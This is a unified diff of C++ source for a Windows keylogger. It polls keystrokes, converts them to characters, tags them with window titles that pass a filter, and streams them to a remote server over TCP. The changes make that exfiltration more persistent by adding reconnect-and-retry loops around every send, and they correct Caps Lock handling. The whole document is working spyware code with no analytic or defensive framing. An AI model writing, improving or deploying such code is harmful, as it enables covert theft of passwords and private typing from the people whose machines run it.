@@ -8,12 +8,12 @@ const std::vector<int> Keylogger::valueKeys = {
 	VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_8,  VK_SPACE // Keyboard specific keys
 };
 const std::vector<int> Keylogger::specialKeys = {VK_LBUTTON, VK_BACK, VK_TAB, VK_RETURN, VK_SHIFT, VK_LCONTROL, VK_RCONTROL, 
-												 VK_MENU, VK_CAPITAL, VK_ESCAPE, VK_DELETE, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN }; //Special Keys
+												 VK_MENU, VK_ESCAPE, VK_DELETE, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN }; //Special Keys
 const std::vector<int> Keylogger::numpadKeys = { VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE }; //Numpad special keys
 const std::vector<std::vector<int>> Keylogger::trackedKeys = { specialKeys, valueKeys, numpadKeys };
 
 const std::vector<std::wstring> Keylogger::specialKeysNames = { L"{LMB}", L"{BSPC}", L"{TAB}",L"{ENTER}",L"{SHIFT}",L"{LCTRL}",
-																L"{RCTRL}",L"{ALT}",L"{CAPS}",L"{ESC}",L"{DEL}",L"{LEFT}",L"{UP}",
+																L"{RCTRL}",L"{ALT}",L"{ESC}",L"{DEL}",L"{LEFT}",L"{UP}",
 																L"{RIGHT}",L"{DOWN}" };
 
 Keylogger::Keylogger(TcpClient* client, Filter* filter) {
@@ -30,8 +30,8 @@ Keylogger::~Keylogger() {
 
 void Keylogger::logKeys() {
 	HWND hWindow = GetForegroundWindow();
-
 	HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));	
+
 	for (unsigned int i = 0; i < trackedKeys.size(); i++) {
 		for (unsigned int j = 0; j < trackedKeys[i].size(); j++) {
 			if (GetAsyncKeyState(trackedKeys[i][j]) & 0x0001) { // key was pressed
@@ -43,7 +43,13 @@ void Keylogger::logKeys() {
 					if (title != this->windowTitle) {
 						if (filter->Check(title)) {
 							isWorthy = true;
-							client->Send(L"\n[" + title + L"]\n\t");
+							std::wstring message = L"\n[" + title + L"]\n\t";
+							while (!client->Send(message)) {
+								if (!client->Connect(L"", L""))
+									Sleep(1000);
+							}
+								
+
 						}
 							
 						else
@@ -57,20 +63,28 @@ void Keylogger::logKeys() {
 				switch (i) //key group
 				{
 				case 0:
-					if (isWorthy)
-						client->Send(this->specialKeysNames[j]);
+
+					if (isWorthy) {
+						while (!client->Send(this->specialKeysNames[j])) {
+							if (!client->Connect(L"", L""))
+								Sleep(1000);
+						}
+					}
 					titleUpdateRequest = true;
 					break;
 				case 1: //valueKeys
 				case 2:
 					wchar_t wcharBuf[2];
 					states[VK_SHIFT] = (GetAsyncKeyState(VK_RSHIFT) & 0x0001) || (GetAsyncKeyState(VK_LSHIFT) & 0x0001) ? 0xff : 0x00;
-					states[VK_CAPITAL] = (GetAsyncKeyState(VK_CAPITAL) & 0x0001) ? 0xff : 0x00;
-					states[VK_MENU] = (GetAsyncKeyState(VK_RMENU) & 0x0001) || (GetAsyncKeyState(VK_LMENU) & 0x0001) ? 0xff : 0x00;
+					states[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? 0xff : 0x00;
 					ToUnicodeEx(trackedKeys[i][j], 0, states, wcharBuf, 2, 0, lang);
 
-					if (isWorthy)
-						client->Send(wcharBuf[0]);
+					if (isWorthy) {
+						while (!client->Send(wcharBuf[0])) {
+							if (!client->Connect(L"", L""))
+								Sleep(1000);
+						}
+					}
 					break;
 				
 				}
